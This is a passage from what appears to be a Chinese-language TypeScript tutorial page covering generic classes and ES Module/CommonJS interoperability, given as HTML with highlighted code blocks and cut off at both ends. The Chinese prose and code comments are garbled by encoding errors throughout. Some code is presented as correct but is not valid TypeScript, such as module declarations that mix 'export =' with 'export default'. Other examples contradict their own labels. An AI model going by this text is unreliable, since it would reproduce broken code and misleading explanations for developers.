class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">State</span>&lt;T&gt; &#123;<br>  <span class="hljs-attr">current</span>: T;<br>  <span class="hljs-attr">history</span>: T[];<br>  <span class="hljs-title function_">update</span>(<span class="hljs-attr">newState</span>: T): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HistoryState</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">State</span>&lt;T&gt; &#123;<br>  <span class="hljs-attr">history</span>: T[] = [];<br>  <br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">current</span>: T</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">push</span>(current);<br>  &#125;<br>  <br>  <span class="hljs-title function_">update</span>(<span class="hljs-params"><span class="hljs-attr">newState</span>: T</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = newState;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">push</span>(newState);<br>  &#125;<br>  <br>  <span class="hljs-title function_">getHistory</span>(): T[] &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>];<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> counterState = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HistoryState</span>&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">0</span>);<br>counterState.<span class="hljs-title function_">update</span>(<span class="hljs-number">1</span>);<br>counterState.<span class="hljs-title function_">update</span>(<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counterState.<span class="hljs-title function_">getHistory</span>()); <span class="hljs-comment">// [0, 1, 2]</span><br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><ol><li>é¿å…è¿‡åº¦æ³›å‹åŒ–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸æ¨èï¼šä¸å¿…è¦çš„æ³›å‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Printer</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">print</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: T</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ¨èï¼šç›´æ¥ä½¿ç”¨å…·ä½“ç±»å‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsolePrinter</span> &#123;<br>  <span class="hljs-title function_">print</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">any</span></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>æä¾›æœ‰æ„ä¹‰çš„ç±»å‹å‚æ•°åï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¨è</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Repository</span>&lt;<span class="hljs-title class_">EntityType</span>&gt; &#123;<br>  <span class="hljs-title function_">save</span>(<span class="hljs-attr">entity</span>: <span class="hljs-title class_">EntityType</span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// ä¸æ¨è</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Repository</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">save</span>(<span class="hljs-attr">e</span>: T): <span class="hljs-built_in">void</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>é»˜è®¤ç±»å‹ç”¨äºé€šç”¨åœºæ™¯ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é€šç”¨ç¼“å­˜é»˜è®¤å­˜å‚¨å¯¹è±¡</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cache</span>&lt;T = <span class="hljs-built_in">object</span>&gt; &#123;<br>  <span class="hljs-keyword">private</span> storage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, T&gt;();<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨é»˜è®¤ç±»å‹</span><br><span class="hljs-keyword">const</span> objectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br></code></pre></td></tr></table></figure><ol start="4"><li>çº¦æŸæ–‡æ¡£åŒ–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ’åºæœåŠ¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@template</span> <span class="hljs-variable">T</span> - æ’åºå…ƒç´ çš„ç±»å‹</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@template</span> <span class="hljs-variable">K</span> - æ’åºä¾æ®çš„é”®åï¼ˆå¿…é¡»æ˜¯Tçš„é”®ï¼‰</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sorter</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; &#123;<br>  <span class="hljs-title function_">sort</span>(<span class="hljs-params"><span class="hljs-attr">items</span>: T[], <span class="hljs-attr">key</span>: K</span>) &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> <br>      a[key] &gt; b[key] ? <span class="hljs-number">1</span> : -<span class="hljs-number">1</span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>ç±»ä¸æ¥å£ååŒï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®šä¹‰æ³›å‹æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Processor</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">process</span>(<span class="hljs-attr">input</span>: T): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// å®ç°å…·ä½“å¤„ç†å™¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumberProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Processor</span>&lt;<span class="hljs-built_in">number</span>&gt; &#123;<br>  <span class="hljs-title function_">process</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(input * <span class="hljs-number">2</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// åˆ›å»ºå¤„ç†å™¨å·¥å‚</span><br><span class="hljs-keyword">const</span> processors = &#123;<br>  <span class="hljs-attr">number</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">NumberProcessor</span>()<br>&#125;;<br><br><span class="hljs-keyword">function</span> processData&lt;T&gt;(<span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">data</span>: T) &#123;<br>  <span class="hljs-keyword">if</span> (processors[<span class="hljs-keyword">type</span>]) &#123;<br>    (processors[<span class="hljs-keyword">type</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">Processor</span>&lt;T&gt;).<span class="hljs-title function_">process</span>(data);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>é—®é¢˜ï¼šæ³›å‹ç±»å®ä¾‹æ–¹æ³•ç±»å‹ä¸¢å¤±</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Wrapper</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-attr">value</span>: T</span>) &#123;&#125;<br>  <br>  <span class="hljs-title function_">getValue</span>(): T &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ç±»å‹ä¿¡æ¯ä¸¢å¤±</span><br><span class="hljs-keyword">const</span> wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Wrapper</span>(<span class="hljs-number">42</span>);<br><span class="hljs-keyword">const</span> value = wrapper.<span class="hljs-title function_">getValue</span>(); <span class="hljs-comment">// value ç±»å‹ä¸º number âœ…</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨æˆå‘˜å˜é‡ä¿å­˜ç±»å‹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeSafeWrapper</span>&lt;T&gt; &#123;<br>  <span class="hljs-comment">// æ˜¾å¼ä¿å­˜ç±»å‹å¼•ç”¨</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> valueType!: T;<br>  <br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-attr">value</span>: T</span>) &#123;&#125;<br>  <br>  <span class="hljs-title function_">getValue</span>(): T &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> safeWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeSafeWrapper</span>(<span class="hljs-string">&quot;text&quot;</span>);<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ValueType</span> = <span class="hljs-keyword">typeof</span> safeWrapper.<span class="hljs-property">valueType</span>; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><p>é—®é¢˜ï¼šæ³›å‹æ¥å£å®ç°å†²çª</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Adder</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-attr">a</span>: T, <span class="hljs-attr">b</span>: T): T;<br>&#125;<br><br><span class="hljs-comment">// é”™è¯¯ï¼šå¿…é¡»ä¸ºæ‰€æœ‰ç±»å‹å‚æ•°æä¾›å®ç°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumberAdder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Adder</span> &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ­£ç¡®ï¼šæŒ‡å®šå…·ä½“ç±»å‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumberAdder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Adder</span>&lt;<span class="hljs-built_in">number</span>&gt; &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br>&#125;<br><br><span class="hljs-comment">// æˆ–ä½¿ç”¨æ³›å‹ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericAdder</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Adder</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-attr">zeroValue</span>: T</span>) &#123;&#125;<br>  <br>  <span class="hljs-title function_">add</span>(<span class="hljs-attr">a</span>: T, <span class="hljs-attr">b</span>: T): T &#123;<br>    <span class="hljs-comment">// å®é™…å®ç°éœ€ä¾èµ–å…·ä½“ç±»å‹</span><br>    <span class="hljs-keyword">return</span> a; <span class="hljs-comment">// ç®€åŒ–ç¤ºä¾‹</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-4-æ¨¡å—ç³»ç»Ÿ"><a href="#1-4-æ¨¡å—ç³»ç»Ÿ" class="headerlink" title="1.4 æ¨¡å—ç³»ç»Ÿ"></a>1.4 æ¨¡å—ç³»ç»Ÿ</h2><h3 id="1-4-1-ES-Module-ä¸-CommonJS-äº’æ“ä½œ"><a href="#1-4-1-ES-Module-ä¸-CommonJS-äº’æ“ä½œ" class="headerlink" title="1.4.1 ES Module ä¸ CommonJS äº’æ“ä½œ"></a>1.4.1 ES Module ä¸ CommonJS äº’æ“ä½œ</h3><p><strong>åŸºæœ¬äº’æ“ä½œæ¨¡å¼</strong></p><table><thead><tr><th align="left">å¯¼å…¥æ–¹å‘</th><th align="left">è¯­æ³•ç¤ºä¾‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">ES â†’ CommonJS</td><td align="left"><code>import fs from &#39;fs&#39;;</code><br><code>import &#123; readFile &#125; from &#39;fs&#39;;</code></td><td align="left">é»˜è®¤å¯¼å…¥æˆ–å…·åå¯¼å…¥</td></tr><tr><td align="left">CommonJS â†’ ES</td><td align="left"><code>const esModule = require(&#39;./es-module&#39;);</code></td><td align="left">é€šè¿‡requireåŠ è½½</td></tr><tr><td align="left">CommonJS â†’ ES (è§£æ„)</td><td align="left"><code>const &#123; namedExport &#125; = require(&#39;./es-module&#39;);</code></td><td align="left">è§£æ„ESæ¨¡å—çš„å…·åå¯¼å‡º</td></tr></tbody></table><p><strong>ESM å¯¼å…¥ CommonJS æ¨¡å—</strong></p><ol><li>é»˜è®¤å¯¼å…¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¯¼å…¥æ•´ä¸ªCommonJSæ¨¡å—</span><br><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br></code></pre></td></tr></table></figure><ol start="2"><li>å…·åå¯¼å…¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¯¼å…¥ç‰¹å®šå±æ€§ï¼ˆéœ€æ¨¡å—æ”¯æŒï¼‰</span><br><span class="hljs-keyword">import</span> &#123; readFile &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;fs&#x27;</span>;<br><span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;file.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;&#125;);<br></code></pre></td></tr></table></figure><ol start="3"><li>åŠ¨æ€å¯¼å…¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¼‚æ­¥åŠ è½½CommonJSæ¨¡å—</span><br><span class="hljs-keyword">const</span> util = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br>util.<span class="hljs-title function_">promisify</span>(<span class="hljs-built_in">setTimeout</span>)(<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>ç±»å‹å£°æ˜è¦æ±‚ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç±»å‹å£°æ˜æ–‡ä»¶éœ€æ”¯æŒä¸¤ç§å¯¼å‡ºæ ¼å¼</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;cjs-module&#x27;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">_default</span>: <span class="hljs-built_in">any</span>;<br>  <span class="hljs-keyword">export</span> = _default;  <span class="hljs-comment">// CommonJSå¯¼å‡º</span><br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> _default; <span class="hljs-comment">// ESé»˜è®¤å¯¼å‡º</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>CommonJS å¯¼å…¥ ESM æ¨¡å—</strong></p><ol><li>é»˜è®¤å¯¼å…¥ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// CommonJS ç¯å¢ƒ</span><br><span class="hljs-keyword">const</span> esModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./es-module&#x27;</span>).<span class="hljs-property">default</span>; <span class="hljs-comment">// å¿…é¡»è®¿é—®.default</span><br>esModule.<span class="hljs-title function_">someMethod</span>();<br></code></pre></td></tr></table></figure><ol start="2"><li>å…·åå¯¼å…¥ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// è§£æ„å…·åå¯¼å‡º</span><br><span class="hljs-keyword">const</span> &#123; namedExport &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./es-module&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="3"><li>å¼‚æ­¥åŠ è½½ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// åœ¨æ”¯æŒtop-level awaitçš„ç¯å¢ƒ</span><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">default</span>: esModule &#125; = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./es-module&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>äº’æ“ä½œä¸­çš„ç±»å‹å¤„ç†</strong></p><ol><li>CommonJS æ¨¡å—ç±»å‹å£°æ˜ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ‡å‡†å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;cjs-module&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">someFunction</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">someValue</span>: <span class="hljs-built_in">number</span>;<br>  <br>  <span class="hljs-keyword">export</span> = &#123; <br>    someFunction,<br>    someValue<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">import</span> cjs <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;cjs-module&#x27;</span>;<br>cjs.<span class="hljs-title function_">someFunction</span>();<br></code></pre></td></tr></table></figure><ol start="2"><li>ES æ¨¡å—ç±»å‹å£°æ˜ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ESæ¨¡å—å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;es-module&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">namedExport</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">defaultExport</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// CommonJSä½¿ç”¨</span><br><span class="hljs-keyword">const</span> esm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;es-module&#x27;</span>);<br>esm.<span class="hljs-title function_">default</span>(); <span class="hljs-comment">// è®¿é—®é»˜è®¤å¯¼å‡º</span><br>esm.<span class="hljs-title function_">namedExport</span>(); <span class="hljs-comment">// è®¿é—®å…·åå¯¼å‡º</span><br></code></pre></td></tr></table></figure><ol start="3"><li>å…¼å®¹ç±»å‹å£°æ˜ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŒæ—¶æ”¯æŒä¸¤ç§å¯¼å…¥æ–¹å¼</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;dual-module&#x27;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">defaultExport</span>: <span class="hljs-built_in">any</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> defaultExport; <span class="hljs-comment">// ESé»˜è®¤å¯¼å‡º</span><br>  <span class="hljs-keyword">export</span> = defaultExport;       <span class="hljs-comment">// CommonJSå¯¼å‡º</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>äº’æ“ä½œé™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</strong></p><p>é™·é˜±1ï¼šé»˜è®¤å¯¼å‡ºæ··æ·†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// CommonJSæ¨¡å—</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// å¯¼å‡ºå‡½æ•°</span><br><br><span class="hljs-comment">// ESæ¨¡å—å¯¼å…¥</span><br><span class="hljs-keyword">import</span> cjsFunc <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;cjs-module&#x27;</span>; <span class="hljs-comment">// âœ… æ­£ç¡®</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> <span class="hljs-keyword">as</span> cjsFunc &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;cjs-module&#x27;</span>; <span class="hljs-comment">// âœ… æ­£ç¡®</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> cjsModule <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;cjs-module&#x27;</span>; <br>cjsModule.<span class="hljs-title function_">default</span>(); <span class="hljs-comment">// âœ… æ­£ç¡®</span><br></code></pre></td></tr></table></figure><p>é™·é˜±2ï¼š__esModule æ ‡å¿—</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// Babel/TSç¼–è¯‘çš„ESMæ¨¡å—ä¼šæ·»åŠ </span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-built_in">exports</span>, <span class="hljs-string">&quot;__esModule&quot;</span>, &#123; <span class="hljs-attr">value</span>: <span class="hljs-literal">true</span> &#125;);<br><br><span class="hljs-comment">// äº’æ“ä½œæ„ä¹‰ï¼šæ ‡è®°æ¨¡å—ä¸ºESMè½¬æ¢è€Œæ¥</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">__esModule</span>) &#123;<br>  <span class="hljs-comment">// æŒ‰ESMè§„èŒƒå¤„ç†</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é™·é˜±3ï¼šåŠ¨æ€å¯¼å…¥å·®å¼‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ESæ¨¡å—</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> value = <span class="hljs-number">42</span>;<br><br><span class="hljs-comment">// CommonJSå¯¼å…¥</span><br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./es-module&#x27;</span>).<span class="hljs-property">value</span>; <span class="hljs-comment">// âŒ å¯èƒ½æœªå®šä¹‰</span><br><span class="hljs-built_in">require</span>(<span 